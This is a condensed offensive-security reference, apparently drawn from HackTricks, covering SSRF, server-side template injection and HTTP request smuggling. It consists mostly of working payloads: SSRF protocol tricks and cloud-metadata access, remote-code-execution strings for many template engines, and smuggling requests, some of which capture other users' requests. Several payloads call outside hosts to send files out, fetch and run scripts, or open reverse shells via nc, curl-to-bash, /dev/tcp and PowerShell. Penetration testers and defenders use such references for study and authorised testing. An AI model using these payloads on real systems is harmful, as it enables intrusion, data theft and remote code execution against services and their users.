# HackTricks Deep-Read: SSRF, SSTI, and HTTP Request Smuggling

## 1. SSRF (Server-Side Request Forgery)

### Basic Information
A SSRF vulnerability occurs when an attacker manipulates a server-side application into making HTTP requests to a domain of their choice.

### Capture SSRF
Tools to capture SSRF interactions: Burp Collaborator, pingb, canarytokens, interactsh, http://webhook.site, ssrf-sheriff, requestrepo.com, cowitness, ngocok.

### Whitelisted Domains Bypass
- URL Format Bypass techniques (see url-format-bypass.html)
- Bypass via open redirect: If SSRF works only on same domain and follows redirects, exploit Open Redirect to access internal resources.

### Protocols

**file://**: `file:///etc/passwd`

**dict://**: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`

**SFTP://**: `sftp://generic.com:11111/`

**TFTP://**: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`

**LDAP://**: `ssrf.php?url=ldap://localhost:11211/%0astats%0aquit`

**SMTP**: Connect to SMTP localhost:25, get internal domain name from 220 banner, search on github for subdomains.

**Curl URL Globbing (WAF bypass)**: `file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}`

### Gopher://
Uses: specify IP, port, and bytes. Can communicate with any TCP server. Tools: Gopherus (MySQL, PostgreSQL, FastCGI, Redis, Zabbix, Memcache), remote-method-guesser (Java RMI).

**Gopher SMTP**:
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A...
```

**Gopher HTTP**:
```
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```

**Gopher SMTP back-connect to 1337**:
```php
<?php header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!"); ?>
```

**Gopher MongoDB - creating admin user**:
```bash
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0...'
```

### SSRF via Referrer Header
Analytics software logs Referrer and may visit external URLs. Use Burp "Collaborator Everywhere" plugin.

### SSRF via SNI data from certificate
Nginx misconfiguration:
```nginx
stream {
    server {
        listen 443;
        resolver 127.0.0.11;
        proxy_pass $ssl_preread_server_name:443;
        ssl_preread on;
    }
}
```
Exploit: `openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf`

### SSRF via TLS AIA CA Issuers (Java mTLS)
Java auto-downloads intermediate CAs using AIA CA Issuers URI. Requirements: mTLS enabled, Java AIA fetching enabled.
- Trigger: attacker cert AIA set to `http://localhost:8080`
- DoS via file://: set AIA to `file:///dev/urandom`

### SSRF via CSS Pre-Processors
LESS `@import` directive fetches and inlines resources during compilation.

### SSRF with Command Injection
Payload: `url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami``

### PDFs Rendering
Insert JS that will be executed by the PDF creator on the server.

### SSRF PHP Functions
See PHP SSRF page for vulnerable PHP and WordPress functions.

### SSRF Redirect to Gopher
Python HTTPServer with 301 redirect to gopher:// payload, or Flask redirect server on port 8443.

### Misconfigured Proxies to SSRF
**Flask**: Use `@` as initial character to make host name the username, inject new host:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```

**Spring Boot**: Start path with `;` then use `@`:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```

**PHP Built-in Web Server**: Use `*` before slash in path, dotless-hex encoded IP:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```

**Reverse proxies accepting absolute URLs**: `GET http://127.0.0.1:8080/ HTTP/1.1` turns reverse proxy into open forward proxy.

### DNS Rebinding CORS/SOP Bypass
Tools: Singularity of Origin (github.com/nccgroup/singularity), publicly running server at http://rebind.it/singularity.html

### DNS Rebinding + TLS Session ID/Session Ticket
Requirements: SSRF, outbound TLS sessions, stuff on local ports. Attack uses TLS session resumption to deliver payload to localhost. Tool: TLS-poison (github.com/jmdx/TLS-poison).

### Blind SSRF
**Time based SSRF**: Check response time to know if resource exists.

**From blind to full abusing status codes**: Send redirects 305-309 to make app follow redirects in error mode, dumping entire redirect chain plus final body. Python server serves chain: 302 -> 305 -> 306 -> 307 -> 308 -> 309 -> 310 -> 302 -> metadata.

### HTML-to-PDF Renderers as Blind SSRF Gadgets
TCPDF and spipu/html2pdf fetch URLs in `<img>` and `<link rel="stylesheet">` attributes server-side.
```html
<html>
  <body>
    <img width="1" height="1" src="http://127.0.0.1:8080/healthz">
    <link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
  </body>
</html>
```

### CFITSIO Extended Filename Syntax (EFS)
Filename as mini-language with SSRF/file primitives:
- **Persistent SSRF**: `https://attacker.example/payload(/var/www/html/grabbed.bin)`
- **GCP metadata with header injection**: `$'http://169.254.169.254/computeMetadata/v1/...\nMetadata-Flavor: Google\nfoo:(/tmp/gcp-token.txt)'`
- **File exfiltration via root://**: `'/etc/passwd(root://127.0.0.1:1094//loot)[b500,1][*,*]'`
- **Mitigations**: Use `fits_open_diskfile()` or `fits_open_datafile()`, sanitize metacharacters.

### Cloud SSRF Exploitation
See cloud-ssrf.html for AWS/GCP/Azure metadata endpoint exploitation.

### Tools
- **SSRFMap**: Detect and exploit SSRF vulnerabilities
- **Gopherus**: Generate Gopher payloads for MySQL, PostgreSQL, FastCGI, Redis, Zabbix, Memcache
- **remote-method-guesser**: Java RMI vulnerability scanner with `--ssrf` and `--gopher` options
- **SSRF Proxy**: Multi-threaded HTTP proxy tunneling client traffic through SSRF-vulnerable servers


## 2. SSTI (Server-Side Template Injection)

### Detection
Fuzz template with special characters: `${{<%[%'"}}%\`. Indicators: thrown errors revealing engine, missing payload parts, template expressions evaluated.

**Plaintext Context**: Test `{{7*7}}`, `${7*7}`.
**Code Context**: Alter input params to check dynamic vs fixed output.

### Identification
Error-causing payloads: `${7/0}`, `{{7/0}}`, `<%= 7/0 %>`.

### Tools
- **TInjA**: `tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."`
- **SSTImap**: `python3 sstimap.py -u "http://example.com/" --crawl 5 --forms`
- **Tplmap**: `python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell`
- **Template Injection Table**: interactive table with polyglots for 44 template engines.

### Java Engines

**Java Basic Injection**:
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```

**Java - Retrieve system environment**:
```java
${T(java.lang.System).getenv()}
```

**Java - Retrieve /etc/passwd**:
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97))...[cat /etc/passwd in char codes]...).getInputStream())}
```

### FreeMarker (Java)
Test at https://try.freemarker.apache.org
- `{{7*7}} = {{7*7}}`, `${7*7} = 49`, `#{7*7} = 49`
- `${7*'7'} Nothing`, `${foobar}`

**RCE**:
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

**FreeMarker Sandbox bypass (< 2.3.30)**:
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

### Velocity (Java)
```java
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat%20/flag563378e453.txt"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor() )
#foreach($i+in+[1..$out.available()])
$out.read()
#end
```

### Thymeleaf
SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`
Expression inlining: `[[${7*7}]]`, `[(...)]`
Expression preprocessing: `__${...}__`
```xml
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```

### Spring Framework (Java)
`*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}`
Bypass filters: try `#{...}`, `*{...}`, `@{...}`, `~{...}`.

**Spring View Manipulation**:
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```

### Pebble (Java)
Old (< 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`
New: Use TYPE, forName, methods array to reach Runtime.

### Jinjava (Java - HubSpot)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('xxx')")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"whoami\"); x.start()")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"netstat\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}
```

### HubSpot HuBL (Java)
Same Jinjava patterns, plus JinjavaConfig access, render chaining.

### Expression Language - EL (Java)
`${"aaaa"}`, `${99999+1}`, `#{7*7}`, `${{7*7}}`, `${{request}}`, `${{session}}`

### Groovy (Java)
```java
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
    assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x
```
XWiki CVE-2025-24893: SolrSearch Groovy RCE on XWiki <= 15.10.10 via RSS search with `}}} {{groovy}}println("id".execute().text){{/groovy}}`

### PHP Engines

**Smarty (PHP)**:
```php
{$smarty.version}
{php}echo `id`;{/php}
{system('ls')}
{system('cat index.php')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

**Twig (PHP)**:
- `{{7*7}} = 49`, `{{7*'7'}} = 49`, `{{1/0}} = Error`
- `{{_self}}`, `{{_self.env}}`, `{{dump(app)}}`
- File read: `"{{'/etc/passwd'|file_excerpt(1,30)}}"@`
- RCE:
```php
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}
{{["error_reporting", "0"]|sort("ini_set")}}
```

### NodeJS Engines

**Jade (NodeJS)**:
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')

#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

**Handlebars (NodeJS)**:
Path traversal: `{"profile":{"layout": "./../routes/index.js"}}`
RCE via constructor chain using `#with`, `split`, `push`, `pop`, `string.sub`, `constructor`.
URL-encoded version available.

**JsRender (NodeJS)**:
Server-side: `{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}`
Client-side: `{{:"test".toString.constructor.call({},"alert('xss')")()}}`

**PugJs (NodeJS)**:
`#{7*7} = 49`
`#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
`#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**NUNJUCKS (NodeJS)**:
- `{{7*7}} = 49`, `{{foo}} = No output`
- RCE:
```javascript
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")() }}
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")() }}
```

**NodeJS expression sandboxes (vm2/isolated-vm)**:
```javascript
={{ (function() {
  const require = this.process.mainModule.require;
  const execSync = require("child_process").execSync;
  return execSync("id").toString();
})() }}
```

### Ruby Engines

**ERB (Ruby)**:
`<%= 7*7 %> = 49`
`<%= system("whoami") %>` (RCE)
`<%= Dir.entries('/') %>` (list folder)
`<%= File.open('/etc/passwd').read %>` (read file)
`<%= system('cat /etc/passwd') %>`
`<%= `ls /` %>`
`<%= IO.popen('ls /').readlines() %>`
`<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>`

**Slim (Ruby)**:
`{ 7 * 7 }`
`{ %x|env| }`

### Python Engines

**Tornado (Python)**:
- `{{7*7}} = 49`, `{{7*'7'}} = 7777777`
```python
{% import os %}
{{os.system('whoami')}}
```

**Jinja2 (Python)**:
- `{{7*7}} = Error`, `{{7*'7'}} = 7777777`, `{{config}}`, `{{config.items()}}`
- `{{settings.SECRET_KEY}}`, `{{settings}}`

**Jinja2 RCE (not dependent on __builtins__)**:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

**Mako (Python)**:
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### .NET Engines

**Razor (.Net)**:
`@(2+2)`, `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
PowerShell encoded command execution.

**ASP**:
`<%= 7*7 %> = 49`, `<%= response.write(date()) %>`
`<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>`

**.Net Bypassing restrictions**:
```csharp
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?"))}
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?")).GetType("System.Diagnostics.Process").GetMethods().GetValue(0).Invoke(null, "/bin/bash,-c \"\"whoami\"\"".Split(","))}
```

### Perl
**Mojolicious (Perl)**: `<%= 7*7 %> = 49`, `<%= perl code %>`, `<% perl code %>`

### Go
**Go Templates**:
`{{ . }}` - reveals data structure, `{{printf "%s" "ssti" }}`, `{{ .System "ls" }}`
XSS in text/template works directly; html/template encodes but template definition can bypass.
RCE via exposed object methods like `{{ .Secret "id" }}` if method calls `exec.Command`.

### LESS (CSS Preprocessor)
`@import` directive fetches resources during compilation. See less-code-injection.html.

### Brute-Force Detection List
Wordlist at: https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt


## 3. HTTP Request Smuggling / HTTP Desync Attack

### What is
Desync between front-end proxies and back-end server: one HTTP request interpreted as single by front-end but as 2 requests by back-end. RFC 2616: "If a message is received with both Transfer-Encoding and Content-Length, the latter MUST be ignored."

**Content-Length**: decimal number of bytes in body, no trailing newline needed.
**Transfer-Encoding: chunked**: hex number per chunk, chunk ends with newline (not counted), must end with `0\r\n\r\n`.
**Connection**: Use `Connection: keep-alive` on first request.

### Basic Examples / Vulnerability Types

**CL.TE**: Front-end uses Content-Length, Back-end uses Transfer-Encoding.
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

**TE.CL**: Front-end uses Transfer-Encoding, Back-end uses Content-Length.
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

**TE.TE**: Both use Transfer-Encoding, one is tricked via obfuscation.
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

**CL.0**: Content-Length present with non-zero value, backend ignores it (treated as 0).
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

**TE.0**: Like CL.0 but using Transfer-Encoding.
```http
OPTIONS / HTTP/1.1
Host: {HOST}
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0


```

**0.CL**: Content-Length with whitespace/format tricks:
```http
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 7

GET /404 HTTP/1.1
X: Y
```

### Forcing via Hop-by-Hop Headers
```http
Connection: Content-Length
```
Proxy deletes Content-Length/Transfer-Encoding header, enabling smuggling.

### Finding HTTP Request Smuggling

**Finding CL.TE via timing**:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Front-end processes CL (cuts body short), back-end waits for next chunk - causes delay/timeout.

**Finding TE.CL via timing**:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
Front-end processes TE (sends whole), back-end waits for CL bytes - causes delay.

**Other detection methods**: Differential Response Analysis, automated tools (Burp HTTP Request Smuggler), Content-Length variance tests, Transfer-Encoding variance tests.

### Distinguishing HTTP/1.1 Pipelining vs Real Smuggling
False positives from connection reuse (keep-alive) and pipelining. Burp tools that can cause FPs: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)".

**Litmus tests**:
1. Disable reuse and re-test (`requestsPerConnection=1`, `pipeline=False`)
2. HTTP/2 nested-response check
3. Partial-requests probe for connection-locked FEs
4. State probes (first vs subsequent request differences)
5. Visualize with "HTTP Hacker" extension

**Connection-locked smuggling**: Some FEs only reuse upstream when client reuses. Prove via HTTP/2 nested-response or partial-requests. Impact: cache poisoning, internal header disclosure, bypass FE controls, host-header abuse.

### Abusing HTTP Request Smuggling

**Circumventing Front-End Security**:
CL.TE to bypass /admin restriction:
```http
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

TE.CL to bypass /admin restriction:
```http
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```

**Revealing Front-End Request Rewriting**:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Headers of subsequent request are reflected in the `search` parameter.

**Capturing Other Users' Requests**:
Smuggle a POST that stores next user's request in a comment parameter:
```http
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=...
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=...

csrf=...&postId=4&name=...&email=...&comment=
```
Captures up to `&` delimiter in URL-encoded forms.

**Exploiting Reflected XSS**:
Smuggle User-Agent header with XSS payload; no user interaction needed:
```http
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```

**HTTP/0.9 bypass**: If Content-Type is text/plain (no XSS), HTTP/0.9 doesn't respond with headers, just body. Smuggle HTTP/0.9 request with fake HTTP/1.1 response in reflected parameter → Content-Type becomes text/html.

**Exploiting On-Site Redirects**:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Next user request redirected to attacker-controlled site. Can serve malicious JS.

**Web Cache Poisoning**:
Smuggle request that poisons cache entry. Combined with on-site redirect to open redirect:
```http
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

**Web Cache Deception**: Smuggle request that causes sensitive user content to be cached under static URL:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Length: 43
Transfer-Encoding: chunked

0
GET /private/messages HTTP/1.1
Foo: X
```

**Abusing TRACE via Request Smuggling**:
Smuggle HEAD request first (returns Content-Length header), then TRACE request (reflects headers as body). TRACE response treated as HEAD body, reflecting arbitrary data.
```http
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```

**TRACE via HTTP Response Splitting**:
HEAD + TRACE smuggling controls reflected data in HEAD response. After Content-Length bytes, inject valid HTTP response.
```http
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDING...HTTP/1.1 200 Ok\r\nContent-Type: text/html\r\nCache-Control: max-age=1000000\r\nContent-Length: 44\r\n\r\n<script>alert("response splitting")</script>
```

### Turbo Intruder Scripts

**CL.TE** (from hipotermia.pw):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False, timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED)
    engine.start()
    attack = '''POST / HTTP/1.1
 Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''
    engine.queue(attack)
    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)
```

**TE.CL** (from hipotermia.pw):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False, timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED)
    engine.start()
    attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
    engine.queue(attack)
    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)
```

### Reverse-Proxy Parsing Footguns (Pingora 2026)

**Premature Upgrade passthrough**: If reverse proxy switches to tunnel mode on seeing `Upgrade` header without waiting for `101 Switching Protocols`:
```http
GET / HTTP/1.1
Host: target.com
Upgrade: anything
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
```

**Transfer-Encoding normalization bugs**: Proxy strips CL when TE present, fails to normalize TE, falls back to close-delimited body. Backend correctly parses TE. Triggers:
- Comma-separated TE list not parsed:
```http
GET / HTTP/1.0
Host: target.com
Connection: keep-alive
Transfer-Encoding: identity, chunked
Content-Length: 29

0

GET /admin HTTP/1.1
X:
```
- Duplicate TE headers not merged:
```http
POST /legit HTTP/1.0
Host: target.com
Connection: keep-alive
Transfer-Encoding: identity
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X:
```

**Path-only cache keys**: Cache key derived only from URI path, ignoring Host/scheme/port. Multi-tenant collision:
```http
GET /api/data HTTP/1.1
Host: evil.com
```
vs
```http
GET /api/data HTTP/1.1
Host: victim.com
```
Both map to same cache key → one tenant poisons content for another.

### Tools
- HTTP Hacker (Burp BApp Store) - visualize concatenation/framing
- Burp Custom Action "Smuggling or pipelining?" bambdas
- https://github.com/anshumanpattnaik/http-request-smuggling
- https://github.com/PortSwigger/http-request-smuggler
- https://github.com/gwen001/pentest-tools/blob/master/smuggler.py
- https://github.com/defparam/smuggler
- https://github.com/Moopinger/smugglefuzz
- https://github.com/bahruzjabiyev/t-reqs-http-fuzzer - grammar-based HTTP fuzzer for smuggling discrepancies
